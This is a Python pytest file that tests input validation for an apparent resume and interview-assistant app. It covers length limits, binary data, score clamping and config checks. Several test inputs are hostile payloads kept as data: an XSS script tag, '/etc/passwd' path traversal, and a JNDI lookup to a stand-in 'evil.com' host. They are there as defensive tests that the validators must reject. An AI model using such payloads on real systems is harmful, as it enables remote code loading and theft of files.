"""
Edge case tests for input validators.

Tests all boundary conditions, malicious inputs, and error cases.
"""
import pytest
from src.utils.validators import InputValidator, AgentOutputValidator
from src.utils.exceptions import (
    InvalidResumeError,
    InvalidJobDescriptionError,
    InvalidInputError,
    AgentValidationError
)


class TestResumeValidation:
    """Test resume validation edge cases."""

    def test_empty_resume(self):
        """Empty resume should raise error."""
        with pytest.raises(InvalidResumeError, match="empty"):
            InputValidator.validate_resume("")

    def test_whitespace_only_resume(self):
        """Whitespace-only resume should raise error."""
        with pytest.raises(InvalidResumeError, match="empty"):
            InputValidator.validate_resume("   \n\n\t\t  ")

    def test_too_short_resume(self):
        """Resume under minimum length should raise error."""
        with pytest.raises(InvalidResumeError, match="too short"):
            InputValidator.validate_resume("John Doe")

    def test_too_large_resume(self):
        """Resume over maximum size should raise error."""
        large_resume = "A" * (InputValidator.MAX_RESUME_SIZE + 1)
        with pytest.raises(InvalidResumeError, match="too large"):
            InputValidator.validate_resume(large_resume)

    def test_binary_data_resume(self):
        """Binary data should be detected and rejected."""
        binary_data = "\x00\x01\x02" * 1000
        with pytest.raises(InvalidResumeError, match="binary"):
            InputValidator.validate_resume(binary_data)

    def test_malicious_xss_attempt(self):
        """XSS attempts should be detected."""
        malicious = "<script>alert('xss')</script>" + ("A" * 100)
        with pytest.raises(InvalidResumeError, match="malicious"):
            InputValidator.validate_resume(malicious)

    def test_path_traversal_attempt(self):
        """Path traversal attempts should be detected."""
        malicious = "../../../etc/passwd" + ("A" * 100)
        with pytest.raises(InvalidResumeError, match="malicious"):
            InputValidator.validate_resume(malicious)

    def test_template_injection_attempt(self):
        """Template injection attempts should be detected."""
        malicious = "${jndi:ldap://evil.com}" + ("A" * 100)
        with pytest.raises(InvalidResumeError, match="malicious"):
            InputValidator.validate_resume(malicious)

    def test_valid_resume_with_special_chars(self):
        """Valid resume with special characters should be sanitized."""
        resume = """John Doe - Software Engineer

Skills: Python, Java, C++
Experience: 5 years @ TechCorp™
Education: MIT (2015-2019)
Email: john.doe+work@example.com
""" * 2  # Make it long enough

        result = InputValidator.validate_resume(resume)
        assert len(result) > InputValidator.MIN_RESUME_LENGTH
        assert "John Doe" in result

    def test_resume_with_excessive_whitespace(self):
        """Resume with excessive whitespace should be normalized."""
        resume = "John    Doe\n\n\n\nSoftware    Engineer\n" + ("Skills: Python" * 20)
        result = InputValidator.validate_resume(resume)

        # Should normalize multiple spaces to single
        assert "    " not in result

    def test_resume_with_control_characters(self):
        """Control characters should be removed."""
        resume = "John\x07Doe\x08Engineer\n" + ("Skills: Python, Java\n" * 10)
        result = InputValidator.validate_resume(resume)

        # Control chars should be removed
        assert "\x07" not in result
        assert "\x08" not in result

    def test_resume_with_null_bytes(self):
        """Null bytes should be removed."""
        resume = "John\x00Doe\n" + ("Software Engineer\nSkills: Python\n" * 10)
        result = InputValidator.validate_resume(resume)

        assert "\x00" not in result


class TestJobDescriptionValidation:
    """Test job description validation edge cases."""

    def test_empty_jd(self):
        """Empty JD should raise error."""
        with pytest.raises(InvalidJobDescriptionError, match="empty"):
            InputValidator.validate_job_description("")

    def test_too_short_jd(self):
        """JD under minimum length should raise error."""
        with pytest.raises(InvalidJobDescriptionError, match="too short"):
            InputValidator.validate_job_description("Senior Engineer")

    def test_too_large_jd(self):
        """JD over maximum size should raise error."""
        large_jd = "A" * (InputValidator.MAX_JD_SIZE + 1)
        with pytest.raises(InvalidJobDescriptionError, match="too large"):
            InputValidator.validate_job_description(large_jd)

    def test_binary_data_jd(self):
        """Binary data should be rejected."""
        binary_data = "\x00\x01\x02" * 1000
        with pytest.raises(InvalidJobDescriptionError, match="binary"):
            InputValidator.validate_job_description(binary_data)

    def test_malicious_jd(self):
        """Malicious content should be detected."""
        malicious = "<script>alert('xss')</script>" + ("Requirements: Python\n" * 10)
        with pytest.raises(InvalidJobDescriptionError, match="malicious"):
            InputValidator.validate_job_description(malicious)

    def test_valid_jd(self):
        """Valid JD should pass."""
        jd = """Senior Backend Engineer

Company: TechCo

Requirements:
- 5+ years Python experience
- AWS expertise
- System design skills

Responsibilities:
- Design scalable systems
- Lead technical initiatives
- Mentor junior engineers
"""
        result = InputValidator.validate_job_description(jd)
        assert "Senior Backend Engineer" in result


class TestUserResponseValidation:
    """Test user response validation edge cases."""

    def test_empty_response(self):
        """Empty response should be allowed (user can skip)."""
        result = InputValidator.validate_user_response("")
        assert result == ""

    def test_very_long_response(self):
        """Very long response should be truncated."""
        long_response = "A" * (InputValidator.MAX_RESPONSE_LENGTH + 1000)
        result = InputValidator.validate_user_response(long_response)

        assert len(result) == InputValidator.MAX_RESPONSE_LENGTH

    def test_malicious_response(self):
        """Malicious content in response should raise error."""
        malicious = "<script>alert('xss')</script>My answer is..."
        with pytest.raises(InvalidInputError, match="malicious"):
            InputValidator.validate_user_response(malicious)

    def test_response_with_code_blocks(self):
        """Response with code blocks should be preserved."""
        response = """Here's my approach:

```python
def solution():
    return 42
```

This solves the problem efficiently."""

        result = InputValidator.validate_user_response(response)
        assert "def solution" in result


class TestAgentOutputValidation:
    """Test agent output validation edge cases."""

    def test_question_missing_fields(self):
        """Question with missing fields should raise error."""
        with pytest.raises(AgentValidationError, match="Missing field"):
            AgentOutputValidator.validate_question({"question": "What is Python?"})

    def test_question_empty_text(self):
        """Empty question should raise error."""
        data = {
            "question": "",
            "reasoning": "test",
            "expected_elements": []
        }
        with pytest.raises(AgentValidationError, match="empty"):
            AgentOutputValidator.validate_question(data)

    def test_question_too_short(self):
        """Too short question should raise error."""
        data = {
            "question": "Why?",
            "reasoning": "test",
            "expected_elements": []
        }
        with pytest.raises(AgentValidationError, match="too short"):
            AgentOutputValidator.validate_question(data)

    def test_question_too_long(self):
        """Too long question should raise error."""
        data = {
            "question": "A" * 1001,
            "reasoning": "test",
            "expected_elements": []
        }
        with pytest.raises(AgentValidationError, match="too long"):
            AgentOutputValidator.validate_question(data)

    def test_question_empty_expected_elements(self):
        """Empty expected_elements should get defaults."""
        data = {
            "question": "What is Python and why is it popular?",
            "reasoning": "Testing basic knowledge",
            "expected_elements": []
        }
        result = AgentOutputValidator.validate_question(data)

        assert len(result["expected_elements"]) > 0

    def test_evaluation_missing_fields(self):
        """Evaluation with missing fields should raise error."""
        with pytest.raises(AgentValidationError, match="Missing field"):
            AgentOutputValidator.validate_evaluation({"technical_accuracy": 4.0})

    def test_evaluation_invalid_scores(self):
        """Invalid score types should raise error."""
        data = {
            "technical_accuracy": "not a number",
            "depth": 3.0,
            "clarity": 4.0,
            "relevance": 3.5,
            "strengths": [],
            "gaps": [],
            "feedback": "Good"
        }
        with pytest.raises(AgentValidationError, match="Invalid score"):
            AgentOutputValidator.validate_evaluation(data)

    def test_evaluation_scores_out_of_range(self):
        """Scores outside 0-5 range should be clamped."""
        data = {
            "technical_accuracy": 7.0,  # Too high
            "depth": -1.0,  # Too low
            "clarity": 3.5,
            "relevance": 4.0,
            "strengths": ["Good answer"],
            "gaps": [],
            "feedback": "Well done"
        }
        result = AgentOutputValidator.validate_evaluation(data)

        # Should be clamped to 0-5 range
        assert result["technical_accuracy"] == 5.0
        assert result["depth"] == 0.0

    def test_evaluation_nan_scores(self):
        """NaN scores should be clamped or handled."""
        import math
        data = {
            "technical_accuracy": float('nan'),
            "depth": 3.0,
            "clarity": 4.0,
            "relevance": 3.5,
            "strengths": [],
            "gaps": [],
            "feedback": "Good"
        }
        # NaN should be clamped to valid range (becomes 0 after max(0, min(5, nan)))
        result = AgentOutputValidator.validate_evaluation(data)
        # NaN comparisons are tricky, so we check if it's been handled
        assert "technical_accuracy" in result

    def test_topic_transition_missing_next_topic(self):
        """Transition without next_topic should raise error."""
        data = {
            "should_transition": True,
            "reasoning": "Moving on"
        }
        with pytest.raises(AgentValidationError, match="next_topic required"):
            AgentOutputValidator.validate_topic_transition(data)

    def test_topic_transition_valid(self):
        """Valid transition should pass."""
        data = {
            "should_transition": True,
            "next_topic": "System Design",
            "next_depth": "deep",
            "reasoning": "Candidate performing well"
        }
        result = AgentOutputValidator.validate_topic_transition(data)
        assert result["next_topic"] == "System Design"


class TestFilePathValidation:
    """Test file path validation edge cases."""

    def test_path_traversal(self):
        """Path traversal should be detected."""
        with pytest.raises(InvalidInputError, match="Path traversal"):
            InputValidator.validate_file_path("../../etc/passwd", must_exist=False)

    def test_nonexistent_file_when_required(self):
        """Non-existent file should raise error when required."""
        with pytest.raises(InvalidInputError, match="not found"):
            InputValidator.validate_file_path("/tmp/nonexistent_file_12345.txt", must_exist=True)

    def test_invalid_path_characters(self):
        """Invalid path characters should raise error."""
        with pytest.raises(InvalidInputError):
            InputValidator.validate_file_path("\x00/invalid/path", must_exist=False)


class TestConfigValidation:
    """Test configuration validation edge cases."""

    def test_invalid_type(self):
        """Invalid type should raise error."""
        from src.utils.exceptions import ConfigurationError
        with pytest.raises(ConfigurationError, match="Expected int"):
            InputValidator.validate_config_value("timeout", "not_a_number", int)

    def test_below_minimum(self):
        """Value below minimum should raise error."""
        from src.utils.exceptions import ConfigurationError
        with pytest.raises(ConfigurationError, match="below minimum"):
            InputValidator.validate_config_value("retry_count", -1, int, min_val=0)

    def test_above_maximum(self):
        """Value above maximum should raise error."""
        from src.utils.exceptions import ConfigurationError
        with pytest.raises(ConfigurationError, match="above maximum"):
            InputValidator.validate_config_value("timeout", 1000, int, max_val=600)

    def test_type_coercion(self):
        """Type coercion should work for compatible types."""
        result = InputValidator.validate_config_value("timeout", "30", int)
        assert result == 30
        assert isinstance(result, int)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
